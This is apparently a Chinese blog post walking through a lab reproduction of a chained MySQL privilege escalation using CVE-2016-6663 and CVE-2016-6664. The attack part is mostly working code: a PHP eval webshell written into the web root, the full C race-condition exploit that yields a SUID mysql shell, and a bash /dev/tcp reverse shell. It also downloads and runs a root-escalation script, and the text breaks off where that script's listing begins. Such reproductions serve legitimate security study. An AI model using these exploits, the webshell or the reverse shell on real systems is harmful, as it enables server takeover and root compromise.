    <id>http://aisibuhuipao.github.io/2022/04/10/%E5%A4%8D%E7%8E%B0MySQL%20CVE-2016-6663%20&amp;%20CVE-2016-6664%20%E7%BB%84%E5%90%88%E6%8F%90%E6%9D%83/</id>
    <published>2022-04-10T14:42:37.000Z</published>
    <updated>2022-04-10T14:42:37.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="复现MySQL-CVE-2016-6663-amp-CVE-2016-6664-组合提权"><a href="#复现MySQL-CVE-2016-6663-amp-CVE-2016-6664-组合提权" class="headerlink" title="复现MySQL CVE-2016-6663 &amp; CVE-2016-6664 组合提权"></a>复现MySQL CVE-2016-6663 &amp; CVE-2016-6664 组合提权</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>​    1.) GetShell 拿到 www-data 权限<br>​    2.) 拿到 CREATE / INSERT / SELECT 低权限的 MySQL 帐户<br>​    3.) 关键提取步骤需要在交互环境瞎, 所以需要反弹 Shell<br>​    4.) MySQL 版本需要 &lt;= 5.5.51 或 5.6.x &lt;= 5.6.32 或 5.7.瞎&lt;= 5.7.14 或 8.x &lt; 8.0.1</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拉取镜像</span></span><br><span class="line">docker pull tutum/lamp</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">docker run -d -P tutum/lamp</span><br><span class="line"><span class="comment"># 查看并进入容器</span></span><br><span class="line">docker ps<span class="comment"># 2a69ebc3709c</span></span><br><span class="line">docker <span class="built_in">exec</span> -it &lt;container_id&gt; /bin/bash<span class="comment"># 2a69ebc3709c</span></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">apt update &amp;&amp; apt install -y wget gcc libmysqlclient-dev</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091506478.png" alt="image-20220409150613850"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091508382.png" alt="image-20220409150709619"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091509332.png" alt="image-20220409150915378"></p><h3 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 添加用户test,密码123456,授予权限create,drop,insert,select</span><br><span class="line">mysql</span><br><span class="line">create database testdb;</span><br><span class="line">CREATE USER 'test'@'%' IDENTIFIED BY '1234'; </span><br><span class="line">grant create,drop,insert,select on testdb.* to 'test'@'%';</span><br><span class="line">flush privileges;  //MySQL用户数据和权限有修改后，希望在”不重启MySQL服务”的情况下直接生效，那么就需要执行这个命令。</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091525490.png" alt="image-20220409152459195"></p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写入webshell</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;?php @eval(\$_POST[1]);?&gt;"</span> &gt;  /<span class="keyword">var</span>/www/html/shell.php</span><br><span class="line"><span class="comment"># 修改权限</span></span><br><span class="line">chmod -R <span class="number">777</span> /<span class="keyword">var</span>/www/html</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091518574.png" alt="image-20220409151848067"></p><p><u>首先蚁剑连webshell</u>: <a href="http://172.17.0.2/">http://172.17.0.2/</a></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091531238.png" alt="image-20220409153143827"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091532479.png" alt="image-20220409153256064"></p><p>用户是: www-data, 是一个低权限用户</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091535434.png" alt="image-20220409153520898"></p><p>上传需要用到的 mysql-privesc-race.c 文件</p><p>CVE-2016-6663 EXP mysql-privesc-race.c 参考链接：<a href="https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html">MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit</a></p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;grp.h&gt;</span><br><span class="line">#include &lt;mysql.h&gt;</span><br><span class="line">#include &lt;pwd.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/inotify.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define EXP_PATH          "/tmp/mysql_privesc_exploit"</span><br><span class="line">#define EXP_DIRN          "mysql_privesc_exploit"</span><br><span class="line">#define MYSQL_TAB_FILE    EXP_PATH "/exploit_table.MYD"</span><br><span class="line">#define MYSQL_TEMP_FILE   EXP_PATH "/exploit_table.TMD"</span><br><span class="line"></span><br><span class="line">#define SUID_SHELL     EXP_PATH "/mysql_suid_shell.MYD"</span><br><span class="line"></span><br><span class="line">#define MAX_DELAY 1000    // can be used in the race to adjust the timing if necessary</span><br><span class="line"></span><br><span class="line">MYSQL *conn;  // DB handles</span><br><span class="line">MYSQL_RES *res;</span><br><span class="line">MYSQL_ROW row;</span><br><span class="line"></span><br><span class="line">unsigned long cnt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void intro() {</span><br><span class="line"></span><br><span class="line">printf( </span><br><span class="line">        "\033[94m\n"</span><br><span class="line">        "MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n"</span><br><span class="line">        "mysql-privesc-race.c (ver. 1.0)\n\n"</span><br><span class="line">        "CVE-2016-6663 / CVE-2016-5616\n\n"</span><br><span class="line">        "For testing purposes only. Do no harm.\n\n"</span><br><span class="line">"Discovered/Coded by:\n\n"</span><br><span class="line">"Dawid Golunski \n"</span><br><span class="line">"http://legalhackers.com"</span><br><span class="line">        "\033[0m\n\n");</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">void usage(char *argv0) {</span><br><span class="line">    intro();</span><br><span class="line">    printf("Usage:\n\n%s user pass db_host database\n\n", argv0);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">void mysql_cmd(char *sql_cmd, int silent) {</span><br><span class="line">    </span><br><span class="line">    if (!silent) {</span><br><span class="line">    printf("%s \n", sql_cmd);</span><br><span class="line">    }</span><br><span class="line">    if (mysql_query(conn, sql_cmd)) {</span><br><span class="line">        fprintf(stderr, "%s\n", mysql_error(conn));</span><br><span class="line">        exit(1);</span><br><span class="line">    }</span><br><span class="line">    res = mysql_store_result(conn);</span><br><span class="line">    if (res&gt;0) mysql_free_result(res);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc,char **argv)</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">    int randomnum = 0;</span><br><span class="line">    int io_notified = 0;</span><br><span class="line">    int myd_handle;</span><br><span class="line">    int wpid;</span><br><span class="line">    int is_shell_suid=0;</span><br><span class="line">    pid_t pid;</span><br><span class="line">    int status;</span><br><span class="line">    struct stat st;</span><br><span class="line">    /* io notify */</span><br><span class="line">    int fd;</span><br><span class="line">    int ret;</span><br><span class="line">    char buf[4096] __attribute__((aligned(8)));</span><br><span class="line">    int num_read;</span><br><span class="line">    struct inotify_event *event;</span><br><span class="line">    /* credentials */</span><br><span class="line">    char *user     = argv[1];</span><br><span class="line">    char *password = argv[2];</span><br><span class="line">    char *db_host  = argv[3];</span><br><span class="line">    char *database = argv[4];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // Disable buffering of stdout</span><br><span class="line">    setvbuf(stdout, NULL, _IONBF, 0);</span><br><span class="line"></span><br><span class="line">    // Get the params</span><br><span class="line">    if (argc!=5) {</span><br><span class="line">usage(argv[0]);</span><br><span class="line">exit(1);</span><br><span class="line">    } </span><br><span class="line">    intro();</span><br><span class="line">    // Show initial privileges</span><br><span class="line">    printf("\n[+] Starting the exploit as: \n");</span><br><span class="line">    system("id");</span><br><span class="line"></span><br><span class="line">    // Connect to the database server with provided credentials</span><br><span class="line">    printf("\n[+] Connecting to the database `%s` as %s@%s\n", database, user, db_host);</span><br><span class="line">    conn = mysql_init(NULL);</span><br><span class="line">    if (!mysql_real_connect(conn, db_host, user, password, database, 0, NULL, 0)) {</span><br><span class="line">        fprintf(stderr, "%s\n", mysql_error(conn));</span><br><span class="line">        exit(1);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    // Prepare tmp dir</span><br><span class="line">    printf("\n[+] Creating exploit temp directory %s\n", "/tmp/" EXP_DIRN);</span><br><span class="line">    umask(000);</span><br><span class="line">    system("rm -rf /tmp/" EXP_DIRN " &amp;&amp; mkdir /tmp/" EXP_DIRN);</span><br><span class="line">    system("chmod g+s /tmp/" EXP_DIRN );</span><br><span class="line"></span><br><span class="line">    // Prepare exploit tables :)</span><br><span class="line">    printf("\n[+] Creating mysql tables \n\n");</span><br><span class="line">    mysql_cmd("DROP TABLE IF EXISTS exploit_table", 0);</span><br><span class="line">    mysql_cmd("DROP TABLE IF EXISTS mysql_suid_shell", 0);</span><br><span class="line">    mysql_cmd("CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 0);</span><br><span class="line">    mysql_cmd("CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 0);</span><br><span class="line"></span><br><span class="line">    // Copy /bin/bash into the mysql_suid_shell.MYD mysql table file</span><br><span class="line">    // The file should be owned by mysql:attacker thanks to the sticky bit on the table directory</span><br><span class="line">    printf("\n[+] Copying bash into the mysql_suid_shell table.\n    After the exploitation the following file/table will be assigned SUID and executable bits : \n");</span><br><span class="line">    system("cp /bin/bash " SUID_SHELL);</span><br><span class="line">    system("ls -l " SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    // Use inotify to get the timing right</span><br><span class="line">    fd = inotify_init();</span><br><span class="line">    if (fd &lt; 0) {</span><br><span class="line">        printf("failed to inotify_init\n");</span><br><span class="line">        return -1;</span><br><span class="line">    }</span><br><span class="line">    ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */</span><br><span class="line"></span><br><span class="line">    printf("\n[+] Entering the race loop... Hang in there...\n");</span><br><span class="line"></span><br><span class="line">    while ( is_shell_suid != 1 ) {</span><br><span class="line"></span><br><span class="line">        cnt++;</span><br><span class="line">if ( (cnt % 100) == 0 ) {</span><br><span class="line"> printf("-&gt;");</span><br><span class="line"> //fflush(stdout);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">        /* Create empty file , remove if already exists */</span><br><span class="line">        unlink(MYSQL_TEMP_FILE);</span><br><span class="line">        unlink(MYSQL_TAB_FILE);</span><br><span class="line">   mysql_cmd("DROP TABLE IF EXISTS exploit_table", 1);</span><br><span class="line">mysql_cmd("CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 1);</span><br><span class="line"></span><br><span class="line">/* random num if needed */</span><br><span class="line">        srand ( time(NULL) );</span><br><span class="line">        randomnum = ( rand() % MAX_DELAY );</span><br><span class="line"></span><br><span class="line">        // Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink</span><br><span class="line">        pid = fork();</span><br><span class="line">        if (pid &lt; 0) {</span><br><span class="line">            fprintf(stderr, "Fork failed :(\n");</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        /* Child process - executes REPAIR TABLE  SQL statement */</span><br><span class="line">        if (pid == 0) {</span><br><span class="line">            usleep(500);</span><br><span class="line">            unlink(MYSQL_TEMP_FILE);</span><br><span class="line">    mysql_cmd("REPAIR TABLE exploit_table EXTENDED", 1);</span><br><span class="line">            // child stops here</span><br><span class="line">            exit(0);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        /* Parent process - aims to replace the temp .tmd table with a symlink before chmod */</span><br><span class="line">        if (pid &gt; 0 ) {</span><br><span class="line">            io_notified = 0;</span><br><span class="line"></span><br><span class="line">            while (1) {</span><br><span class="line">                int processed = 0;</span><br><span class="line">                ret = read(fd, buf, sizeof(buf));</span><br><span class="line">                if (ret &lt; 0) {</span><br><span class="line">                    break;</span><br><span class="line">                }</span><br><span class="line">                while (processed &lt; ret) {</span><br><span class="line">                    event = (struct inotify_event *)(buf + processed);</span><br><span class="line">                    if (event-&gt;mask &amp; IN_CLOSE) {</span><br><span class="line">                        if (!strcmp(event-&gt;name, "exploit_table.TMD")) {</span><br><span class="line">                            //usleep(randomnum);</span><br><span class="line"></span><br><span class="line">    // Set the .MYD permissions to suid+exec before they get copied to the .TMD file </span><br><span class="line">    unlink(MYSQL_TAB_FILE);</span><br><span class="line">    myd_handle = open(MYSQL_TAB_FILE, O_CREAT, 0777);</span><br><span class="line">    close(myd_handle);</span><br><span class="line">    chmod(MYSQL_TAB_FILE, 04777);</span><br><span class="line"></span><br><span class="line">    // Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec</span><br><span class="line">                            unlink(MYSQL_TEMP_FILE);</span><br><span class="line">                            symlink(SUID_SHELL, MYSQL_TEMP_FILE);</span><br><span class="line">                            io_notified=1;</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                    processed += sizeof(struct inotify_event);</span><br><span class="line">                }</span><br><span class="line">                if (io_notified) {</span><br><span class="line">                    break;</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            waitpid(pid, &amp;status, 0);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">// Check if SUID bit was set at the end of this attempt</span><br><span class="line">        if ( lstat(SUID_SHELL, &amp;st) == 0 ) {</span><br><span class="line">    if (st.st_mode &amp; S_ISUID) {</span><br><span class="line">is_shell_suid = 1;</span><br><span class="line">    }</span><br><span class="line">        } </span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    printf("\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n", cnt);</span><br><span class="line">    system("ls -l " SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    printf("\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n    Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n");</span><br><span class="line">    system(SUID_SHELL " -p -i ");</span><br><span class="line">    //system(SUID_SHELL " -p -c '/bin/bash -i -p'");</span><br><span class="line"></span><br><span class="line">    /* close MySQL connection and exit */</span><br><span class="line">    printf("\n[+] Job done. Exiting\n\n");</span><br><span class="line">    mysql_close(conn);</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091542561.png" alt="image-20220409154215199"></p><p>蚁剑终端反弹 Shell</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.232.129/4444 0&gt;&amp;1</span><br><span class="line"><span class="comment"># 有可能会报错: Syntax error: Bad fd number</span></span><br><span class="line"><span class="comment"># 解决方法</span></span><br><span class="line">rm -f /bin/sh</span><br><span class="line">ln -sf /bin/bash /bin/sh</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091609390.png" alt="image-20220409160935454"></p><h3 id="提示为-MySQL-权限"><a href="#提示为-MySQL-权限" class="headerlink" title="提示为 MySQL 权限"></a>提示为 MySQL 权限</h3><p><strong>利用CVE-2016-6663</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入刚刚上传的POC的目录下</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">gcc mysql-privesc-race.c -o mysql-privesc-race -I /usr/include/mysql -l mysqlclient</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">./mysql-privesc-race <span class="built_in">test</span> 1234 localhost testdb</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091622915.png" alt="image-20220409162230577"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091623093.png" alt="image-20220409162306004"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091624431.png" alt="image-20220409162457137"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091626922.png" alt="image-20220409162629415"></p><h3 id="Mysql权限提升为root权限"><a href="#Mysql权限提升为root权限" class="headerlink" title="Mysql权限提升为root权限"></a>Mysql权限提升为root权限</h3><p><strong>利用CVE-2016-6664</strong><br>漏洞成功利用的条件:<br>    1.) MySQL-based数据库版本符合条件<br>    2.) 攻击者已经获得MySQL系统用户权限<br>    3.) MySQL错误日志使用默认基于文件的配置, 未使用syslog</p><p>目标主机MySQL配置必须是基于文件的日志(默认配置), 也就是不能是syslog方式, 不过tutum/lamp日志方式为syslog, 需要做如下的修改</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/mysql/conf.d/mysqld_safe_syslog.cnf</span><br><span class="line">删除syslog</span><br><span class="line">重启mysql：mysqld_safe --user=mysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试办法</span></span><br><span class="line">grep -r syslog /etc/mysql返回没有任何结果就满足“基于文件的日志”要求</span><br><span class="line">上传的mysql-chowned.sh 内容如下</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091638290.png" alt="image-20220409163804618"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091639515.png" alt="image-20220409163913332"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091640537.png" alt="image-20220409164030357"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091641576.png" alt="image-20220409164117395"></p><p><strong>必须以mysql权限执行才能成功提为root，可以利用CVE-2016-6663提升为mysql权限的shell执行如下指令</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载 POC 文件</span></span><br><span class="line">wget http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh</span><br><span class="line"><span class="comment"># 修改权限</span></span><br><span class="line">chmod 777 mysql-chowned.sh</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">./mysql-chowned.sh /var/<span class="built_in">log</span>/mysql/error.log</span><br></pre></td></tr></tbody></table></figure><p>运行脚本之前可以查看一下error log文件的位置（默认是在mysql的数据目录下, debian上为/var/lib/mysql/hostname.err）</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091748634.png" alt="image-20220409174821674"></p><p>已提升至 root 权限</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091757476.png" alt="image-20220409175540475"></p><p><strong>POC: mysql-chowned.sh 内容如下</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span 